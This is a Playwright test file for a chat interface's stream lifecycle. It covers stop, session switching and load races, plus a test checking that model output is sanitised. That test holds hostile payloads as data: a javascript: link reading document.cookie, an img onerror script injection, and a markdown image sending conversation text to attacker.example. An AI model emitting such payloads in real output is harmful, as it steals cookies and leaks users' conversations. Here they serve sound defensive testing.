import { test, expect, Page, Route } from "@playwright/test";

/**
 * The parts of the chat stream that happen *around* a run: stopping it, leaving it for another
 * conversation, and racing two session loads. Plus what the transcript is allowed to render from
 * untrusted model output.
 *
 * `page.route` can only fulfil a response whole, so a stream that has said something and is still
 * open cannot be scripted with it. {@link installHangingStream} replaces `fetch` for the stream POST
 * only, with a body that emits one delta and then stays open until the request's signal aborts —
 * exactly what a real agent mid-answer looks like to the client.
 */

const ME_UUID = "11111111-1111-1111-1111-111111111111";
const ASSET_UUID = "33333333-3333-3333-3333-333333333333";
const PARTIAL = "PARTIAL-ANSWER-FROM-THE-FIRST-CHAT";

interface StoredChat {
  uuid: string;
  title: string;
  messages: Record<string, unknown>[];
}

function json(route: Route, body: unknown, status = 200) {
  return route.fulfill({ status, contentType: "application/json", body: JSON.stringify(body) });
}

function sse(events: Array<[string, unknown]>): string {
  return events.map(([type, data]) => `event: ${type}\ndata: ${JSON.stringify(data)}\n\n`).join("");
}

interface Captured {
  streamDeletes: string[];
  chatLoads: string[];
}

async function installMocks(
  page: Page,
  opts: {
    chats?: StoredChat[];
    /** Hold GET /chats/:uuid for these uuids until the returned release function is called. */
    holdLoads?: string[];
    streamBody?: string;
  } = {},
) {
  const chats: StoredChat[] = [...(opts.chats ?? [])];
  const captured: Captured = { streamDeletes: [], chatLoads: [] };
  const gates = new Map<string, () => void>();
  const gatePromises = new Map<string, Promise<void>>();
  for (const uuid of opts.holdLoads ?? []) {
    gatePromises.set(uuid, new Promise<void>(resolve => gates.set(uuid, resolve)));
  }
  let seq = 0;

  await page.route(/\/api\/v1\//, route => json(route, { data: [] }));
  await page.route(/\/api\/v1\/login$/, route => json(route, { token: "fake-jwt" }));
  await page.route(/\/api\/v1\/me$/, route => json(route, { uuid: ME_UUID, username: "admin", enabled: true }));
  await page.route(new RegExp(`/api/v1/assets/${ASSET_UUID}$`), route =>
    json(route, {
      uuid: ASSET_UUID,
      file: { filename: "beach.mp4", mimeType: "video/mp4", size: 12_000_000 },
      // Milliseconds, as asset_video_comp.media_duration is stored and served.
      videoComponents: [{ width: 1920, height: 1080, duration: 42_000 }],
    }));

  await page.route(/\/api\/v1\/chats$/, route => {
    if (route.request().method() === "POST") {
      const body = JSON.parse(route.request().postData() || "{}");
      const created: StoredChat = { uuid: `chat-new-${++seq}`, title: body.title ?? "chat", messages: [] };
      chats.unshift(created);
      return json(route, created, 201);
    }
    return json(route, { data: chats });
  });

  await page.route(/\/api\/v1\/chats\/[^/]+\/stream$/, route => {
    if (route.request().method() === "DELETE") {
      captured.streamDeletes.push(route.request().url());
      return route.fulfill({ status: 204, body: "" });
    }
    return route.fulfill({ status: 200, contentType: "text/event-stream", body: opts.streamBody ?? "" });
  });

  await page.route(/\/api\/v1\/chats\/[^/]+$/, async route => {
    const uuid = route.request().url().split("/chats/")[1].split("?")[0];
    if (route.request().method() === "GET") {
      captured.chatLoads.push(uuid);
      const gate = gatePromises.get(uuid);
      if (gate) await gate;
    }
    const found = chats.find(c => c.uuid === uuid);
    return json(route, found ?? {}, found ? 200 : 404);
  });

  return { captured, release: (uuid: string) => gates.get(uuid)?.() };
}

/** Replace fetch for the stream POST with one that says {@link PARTIAL} and then hangs until aborted. */
async function installHangingStream(page: Page) {
  await page.addInitScript((partial: string) => {
    const original = window.fetch.bind(window);
    window.fetch = (input: RequestInfo | URL, init?: RequestInit) => {
      const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
      if (/\/chats\/[^/]+\/stream$/.test(url) && (init?.method ?? "GET").toUpperCase() === "POST") {
        const encoder = new TextEncoder();
        const body = new ReadableStream<Uint8Array>({
          start(controller) {
            controller.enqueue(encoder.encode(`event: text_delta\ndata: ${JSON.stringify({ turn: 1, text: partial })}\n\n`));
            init?.signal?.addEventListener("abort", () => controller.error(new DOMException("aborted", "AbortError")));
          },
        });
        return Promise.resolve(new Response(body, { status: 200, headers: { "Content-Type": "text/event-stream" } }));
      }
      return original(input, init);
    };
  }, PARTIAL);
}

async function login(page: Page) {
  await page.goto("/");
  if (await page.getByPlaceholder("Username").count() === 0) return;
  await page.getByPlaceholder("Username").fill("admin");
  await page.getByPlaceholder("Password").fill("finger");
  await page.getByRole("button", { name: /sign in/i }).click();
  await expect(page.getByPlaceholder("Username")).toBeHidden({ timeout: 10_000 });
}

async function send(page: Page, text: string) {
  const input = page.getByPlaceholder(/Ask about assets/i);
  await expect(input).toBeVisible({ timeout: 10_000 });
  await input.fill(text);
  await input.press("Enter");
}

test.describe("Chat stream lifecycle – mocked", () => {
  test("stop aborts the run, tells the server, and keeps what was already said", async ({ page }) => {
    await installHangingStream(page);
    const { captured } = await installMocks(page);
    await login(page);
    await send(page, "a long question");

    await expect(page.getByText(PARTIAL)).toBeVisible({ timeout: 10_000 });
    await page.getByTestId("chat-stop-button").click();

    await expect(page.getByTestId("chat-stop-button")).toBeHidden({ timeout: 10_000 });
    await expect.poll(() => captured.streamDeletes.length).toBe(1);
    expect(captured.streamDeletes[0]).toMatch(/\/chats\/chat-new-1\/stream$/);
    // The partial answer stays in the transcript, under the question.
    const column = page.getByTestId("chat-column");
    await expect(column.getByText(PARTIAL)).toBeVisible();
    await expect(column.getByText("a long question", { exact: true })).toBeVisible();
  });

  test("a new chat opened mid-stream does not inherit the old chat's half-answer", async ({ page }) => {
    await installHangingStream(page);
    await installMocks(page);
    await login(page);
    await send(page, "first conversation");
    await expect(page.getByText(PARTIAL)).toBeVisible({ timeout: 10_000 });

    await page.getByText("New chat", { exact: true }).click();

    // The fresh conversation is empty: greeting, no stale bubble from the aborted run.
    await expect(page.getByTestId("chat-stop-button")).toBeHidden({ timeout: 10_000 });
    // Scoped to the transcript: the rail still lists the first conversation by its title.
    await expect(page.getByTestId("chat-column").getByText("first conversation")).toHaveCount(0);
    await expect(page.getByTestId("markdown-content").filter({ hasText: PARTIAL })).toHaveCount(0);
  });

  test("opening another session mid-stream shows that session only", async ({ page }) => {
    await installHangingStream(page);
    await installMocks(page, {
      chats: [{ uuid: "chat-other", title: "Other session", messages: [
        { id: "o1", role: "assistant", content: "OTHER-SESSION-CONTENT", createdAt: new Date().toISOString() },
      ] }],
    });
    await login(page);
    await send(page, "first conversation");
    await expect(page.getByText(PARTIAL)).toBeVisible({ timeout: 10_000 });

    await page.getByText("Other session", { exact: true }).click();

    await expect(page.getByText("OTHER-SESSION-CONTENT")).toBeVisible({ timeout: 10_000 });
    await expect(page.getByTestId("chat-stop-button")).toBeHidden({ timeout: 10_000 });
    await expect(page.getByTestId("markdown-content").filter({ hasText: PARTIAL })).toHaveCount(0);
  });

  test("the session clicked last wins, even when an earlier click answers later", async ({ page }) => {
    const now = new Date().toISOString();
    const { captured, release } = await installMocks(page, {
      chats: [
        { uuid: "chat-slow", title: "Slow session", messages: [{ id: "s1", role: "assistant", content: "SLOW-SESSION-CONTENT", createdAt: now }] },
        { uuid: "chat-fast", title: "Fast session", messages: [{ id: "f1", role: "assistant", content: "FAST-SESSION-CONTENT", createdAt: now }] },
      ],
      holdLoads: ["chat-slow"],
    });
    await login(page);

    await page.getByText("Slow session", { exact: true }).click();
    await expect.poll(() => captured.chatLoads.includes("chat-slow")).toBe(true);
    await page.getByText("Fast session", { exact: true }).click();
    await expect(page.getByText("FAST-SESSION-CONTENT")).toBeVisible({ timeout: 10_000 });

    // Give the slow answer every chance to land, then check it did not.
    const slowAnswered = page.waitForResponse(r => r.url().endsWith("/chats/chat-slow"));
    release("chat-slow");
    await slowAnswered;
    await page.evaluate(() => new Promise(requestAnimationFrame));
    await expect(page.getByText("FAST-SESSION-CONTENT")).toBeVisible();
    await expect(page.getByText("SLOW-SESSION-CONTENT")).toHaveCount(0);
  });

  test("the panel shows a clip's duration in minutes and seconds, not milliseconds", async ({ page }) => {
    const chatUuid = "chat-new-1";
    await installMocks(page, {
      streamBody: sse([
        ["tool_start", { turn: 1, toolCallId: "c1", name: "search_assets", args: {} }],
        ["tool_end", {
          turn: 1, toolCallId: "c1", name: "search_assets", isError: false, summary: "Found 1 asset",
          references: [{ type: "asset", uuid: ASSET_UUID, label: "beach.mp4" }],
        }],
        ["message_end", { message: { id: "m1", role: "assistant", content: "Here it is.", createdAt: new Date().toISOString() } }],
        ["agent_end", { chatUuid, status: "completed" }],
      ]),
    });
    await login(page);
    await send(page, "find the beach clip");

    await page.locator(".MuiChip-root", { hasText: "beach.mp4" }).first().click();
    const panel = page.getByTestId("chat-workspace-panel");
    await expect(panel.getByText("Duration", { exact: true })).toBeVisible({ timeout: 10_000 });
    // 42 000 ms is 0:42. Read raw it rendered as "700:00".
    await expect(panel.getByText("0:42", { exact: true })).toBeVisible();
    await expect(panel.getByText("1920×1080", { exact: true })).toBeVisible();
  });

  test("model output cannot run script, inject HTML, or load an image from another host", async ({ page }) => {
    const attackerHits: string[] = [];
    await page.route("https://attacker.example/**", route => {
      attackerHits.push(route.request().url());
      return route.fulfill({ status: 200, contentType: "image/png", body: "" });
    });
    const hostile = [
      "[click me](javascript:alert(document.cookie))",
      "",
      "<img src=x onerror=\"window.__pwned=1\"><b>raw-bold</b>",
      "",
      "![leak](https://attacker.example/p.png?q=secret-conversation)",
    ].join("\n");
    await installMocks(page, {
      streamBody: sse([
        ["text_delta", { turn: 1, text: hostile }],
        ["message_end", { message: { id: "m1", role: "assistant", content: hostile, createdAt: new Date().toISOString() } }],
        ["agent_end", { chatUuid: "chat-new-1", status: "completed" }],
      ]),
    });
    await login(page);
    await send(page, "summarise the metadata");

    const answer = page.getByTestId("markdown-content").filter({ hasText: "click me" }).last();
    await expect(answer).toBeVisible({ timeout: 10_000 });

    // javascript: is blanked by the url transform.
    const link = answer.getByText("click me", { exact: true });
    expect(await link.getAttribute("href") ?? "").not.toMatch(/javascript:/i);
    // Raw HTML stays text: no <b>, no <img> from the markup.
    await expect(answer.locator("b")).toHaveCount(0);
    await expect(answer).toContainText("raw-bold");
    // The foreign image is a link, not a fetch.
    await expect(answer.locator("img")).toHaveCount(0);
    const blocked = answer.getByTestId("markdown-blocked-image");
    await expect(blocked).toHaveText("leak");
    await expect(blocked).toHaveAttribute("href", /attacker\.example/);
    await expect(blocked).toHaveAttribute("rel", /noopener/);
    expect(attackerHits).toHaveLength(0);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
  });
});
